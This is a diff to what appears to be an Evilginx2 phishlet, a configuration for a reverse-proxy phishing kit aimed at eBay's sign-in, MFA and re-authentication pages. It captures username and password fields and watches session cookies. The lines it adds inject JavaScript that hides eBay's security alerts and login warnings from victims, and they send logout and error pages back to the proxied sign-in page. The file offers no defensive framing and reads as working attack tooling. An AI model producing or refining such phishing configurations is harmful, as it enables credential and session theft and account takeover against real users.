@@ -188,47 +188,74 @@ login:
       - { name: 'userid', required: true }    # Username field
       - { name: 'pass', required: true }      # Password field
 rules:
+  # Rule 1: Handle login page JavaScript injection
   - triggers:
       - domain: ebay.com
         path: /signin
-        cookie:
-          contains: s
-        action: inject
+    action: inject
     inject_js:
       code: |
         (function() {
-          console.log('Evilginx2 custom script: Executed on /signin');
-          // Additional JS to ensure smooth interaction with the login page.
+          console.log("Custom JS for eBay login page");
+          // Hiding any potential security alerts on login
+          const securityAlerts = document.querySelectorAll('.security-alert, .login-warning');
+          securityAlerts.forEach(el => el.style.display = 'none');
+          
+          // Optional: Log submission event for debugging
+          const loginForm = document.querySelector('form');
+          if (loginForm) {
+            loginForm.addEventListener('submit', () => {
+              console.log("Login form submitted.");
+            });
+          }
         })();
+
+  # Rule 2: Handle MFA page injection
   - triggers:
       - domain: ebay.com
         path: /mfa
         cookie:
-          contains: dp1
-        action: inject
+          contains: dp1    # Check if the user's session has dp1 cookie (used by eBay for session management)
+    action: inject
     inject_js:
       code: |
         (function() {
-          console.log('Handling MFA for ebay.com');
-          // Insert any JS required for MFA handling.
+          console.log("Handling eBay MFA page");
+          // Code to handle MFA prompts if needed.
+          // Optional: Automatically advance if certain elements are present
+          const mfaPrompt = document.querySelector('.mfa-prompt');
+          if (mfaPrompt) {
+            console.log("MFA prompt detected. Ensure user interaction.");
+          }
         })();
+
+  # Rule 3: Handle re-authentication page (if user is redirected to it)
   - triggers:
       - domain: ebay.com
         path: /reauth
         cookie:
-          contains: ebay_token
-        action: inject
+          contains: ebay_token  # Session-based token for eBay re-authentication check
+    action: inject
     inject_js:
-      code: >
+      code: |
         (function() {
-          console.log('Handling re-authentication for session continuity');
-          // Insert JavaScript for re-authentication or session refresh if needed.
+          console.log("Handling eBay re-authentication for session continuity");
+          // Additional JavaScript for handling the re-authentication flow if needed.
         })();
+
+  # Rule 4: Redirect to login page upon logout
   - triggers:
       - domain: ebay.com
         path: /logout
-        action: redirect
-        redirect_to: https://www.ebay.com/signin
+    action: redirect
+    redirect_to: https://www.ebay.com/signin
+
+  # Rule 5: Redirect error pages to the main login page for a seamless experience
+  - triggers:
+      - domain: ebay.com
+        path: /n/error     # This is commonly used for handling error redirects.
+    action: redirect
+    redirect_to: https://www.ebay.com/signin
 js_inject:
 - trigger_domains: ["signin.ebay.com", "www.ebay.com", "pay.ebay.com", "my.ebay.com", "auth.ebay.com"]
   trigger_paths: ["/signin", "/signin?signInAction=login", "/myb/SignIn", "/verify", "/my", "/myb/Account", "/pay", "/pay/checkout", "/logout"]
